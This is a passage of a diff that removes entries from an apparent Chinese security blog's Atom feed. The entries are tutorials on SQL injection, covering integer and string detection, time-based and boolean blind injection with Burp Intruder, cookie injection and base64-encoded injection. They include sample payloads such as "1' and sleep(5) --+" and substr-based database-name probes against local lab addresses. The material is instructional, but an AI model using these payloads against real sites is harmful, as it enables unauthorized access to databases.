-        &lt;h1 id=&quot;大小写绕过：&quot;&gt;&lt;a href=&quot;#大小写绕过：&quot; class=&quot;headerlink&quot; title=&quot;大小写绕过：&quot;&gt;&lt;/a&gt;大小写绕过：&lt;/h1&gt;&lt;p&gt;此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。&lt;/
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SQL注入基本知识</title>
-    <link href="http://yoursite.com/2019/08/09/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/"/>
-    <id>http://yoursite.com/2019/08/09/SQL注入基本知识/</id>
-    <published>2019-08-09T14:47:44.668Z</published>
-    <updated>2019-08-14T15:06:20.789Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a></p><h1 id="SQL注入概念："><a href="#SQL注入概念：" class="headerlink" title="SQL注入概念："></a>SQL注入概念：</h1><p>所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意的）SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</p><h1 id="SQL注入原理："><a href="#SQL注入原理：" class="headerlink" title="SQL注入原理："></a>SQL注入原理：</h1><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><p>根据相关技术原理，SQL注入可以分为平台层注入和代码层注入。前者由不安全的数据库配置或数据库平台的漏洞所致；后者主要是由于程序员对输入未进行细致地过滤，从而执行了非法的数据查询。基于此，SQL注入的产生原因通常表现在以下几方面：</p><p>①不当的类型处理；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤转义字符处理不合适；</p><p>⑥多个提交处理不当。</p><h1 id="判断注入类型（整型）："><a href="#判断注入类型（整型）：" class="headerlink" title="判断注入类型（整型）："></a>判断注入类型（整型）：</h1><p>id=1    页面正常</p><p>id=1 and 1=1    页面正常</p><p>id=1 and 1=2    页面报错</p><p>*从以上三个条件可以判断该页面存在sql注入，并且为整型</p><h1 id="判断注入类型（字符型）："><a href="#判断注入类型（字符型）：" class="headerlink" title="判断注入类型（字符型）："></a>判断注入类型（字符型）：</h1><p> id=1    页面正常</p><p>id=1 and 1=1    页面正常</p><p>id=1 and 1=2    页面正常</p><p>id=1’ and 1=1#    页面正常</p><p>id=1’ and 1=2#    页面报错</p><p>*从以上五个条件可以判断该页面存在sql注入，并且为字符型</p><h1 id="判断注入类型（时间盲注）："><a href="#判断注入类型（时间盲注）：" class="headerlink" title="判断注入类型（时间盲注）："></a>判断注入类型（时间盲注）：</h1><p>*时间盲注在任何时候不会报错，也不会出现任何有用信息</p><p>*id=1’ and sleep(5) –+：若页面响应时间延迟，可以判断存在哪种注入</p><h1 id="常用注释符："><a href="#常用注释符：" class="headerlink" title="常用注释符："></a>常用注释符：</h1><p>#，–+，– ，– -等，或者可以将字符转换成对应的URL</p><h1 id="利用Burp进行盲注："><a href="#利用Burp进行盲注：" class="headerlink" title="利用Burp进行盲注："></a>利用Burp进行盲注：</h1><p>布尔盲注指页面只返回true和false两个结果，并没有返回报错等有用信息</p><p>以爆破数据库为例：1’ and substr(database(),1,1)=’a’–+</p><p>1、用Burp进行拦截抓包</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zljdr7u4j30h406gq3d.jpg" alt></p><p>2、右键-发送给测试器</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlk2ugmpj30qc07pwf5.jpg" alt></p><p>3、清除§-添加§</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlkbey11j304f07aq2t.jpg" alt></p><p>​    *清除§之后，添加的位置为要变动的值，如上面的’a’</p><p>4、有效载荷-从列表中添加</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlkk1fg4j30cu08s74c.jpg" alt></p><p>​    *字典除了Burp自带的一些简单字典外，还可以选择外部的字典。</p><p>5、开始攻击</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zlll4f1ej30cv01umwy.jpg" alt></p><p>​    *攻击会自动遍历字典里的值，正确的值在返回的字符长度上和错误值不相同，这样就可以确认具体字符。</p><p>​    *若是时间盲注，正确和错误信息返回的长度都是一样的，此时需要看数据返回时间，具体操作：列-接收响应计数。</p><p><img src="http://ww1.sinaimg.cn/large/006bOYmUgy1g5zllv9gpdj30e108pdg1.jpg" alt></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://127.0.0.1/web/union.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/web/union.php?id=1&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&quot;SQL注入概
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Cookie注入</title>
-    <link href="http://yoursite.com/2019/08/09/Cookie%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/Cookie注入/</id>
-    <published>2019-08-09T14:47:44.579Z</published>
-    <updated>2019-08-09T14:58:25.415Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.29/web/cookie.php" target="_blank" rel="noopener">http://172.16.13.29/web/cookie.php</a></p><h1 id="利用Burp抓包："><a href="#利用Burp抓包：" class="headerlink" title="利用Burp抓包："></a>利用Burp抓包：</h1><p>*抓包后发送到重发器，然后在重发器的cookie值后面构造语句</p><h1 id="在重发器中构造语句"><a href="#在重发器中构造语句" class="headerlink" title="在重发器中构造语句:"></a>在重发器中构造语句:</h1><p>*这里和其他注入方式一样，只不过语句是在Burp的重发器中构造的</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*cookie注入其原理也和平时的注入一样，只不过说我们是将提交的参数已cookie方式提交了，而一般的注入我们是使用get或者post方式提交，get方式提交就是直接在网址后面加上需要注入的语句，post则是通过表单方式，get和post的不同之处就在于一个我们可以通过IE地址栏处看到我们提交的参数，而另外一个却不能。</p><p>*相对post和get方式注入来说，cookie注入就要稍微繁琐一些了，要进行cookie注入，我们首先就要修改cookie，这里就需要使用到Javascript语言了。另外cookie注入的形成有两个必须条件，条件1是：程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2是：在条件1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.29/web/cookie.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.29/web/cookie.php&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&quot;利用Burp抓包
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>BASE64注入</title>
-    <link href="http://yoursite.com/2019/08/09/Base64%E6%B3%A8%E5%85%A5/"/>
-    <id>http://yoursite.com/2019/08/09/Base64注入/</id>
-    <published>2019-08-09T14:47:44.577Z</published>
-    <updated>2019-08-09T14:58:21.749Z</updated>
-    
-    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.29/web/base64.php" target="_blank" rel="noopener">http://172.16.13.29/web/base64.php</a></p><h1 id="语句编码："><a href="#语句编码：" class="headerlink" title="语句编码："></a>语句编码：</h1><p>*base64注入的原理是将构造语句进行base64编码，例如id=1，这里把等号后面的内容变成Base64的编码方式，意思就是1→MQ==，在整个注入过程的构造语句都编码成Base64，视具体情况，还可编码成url等其他编码方式。</p><p>*注入过程与其他主流的注入方式相同。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.29/web/base64.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.29/web/base64.php&lt;/a&gt;&lt;/p&gt;
-&lt;h1 id=&quot;语句编码：&quot;&gt;&lt;
-      
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
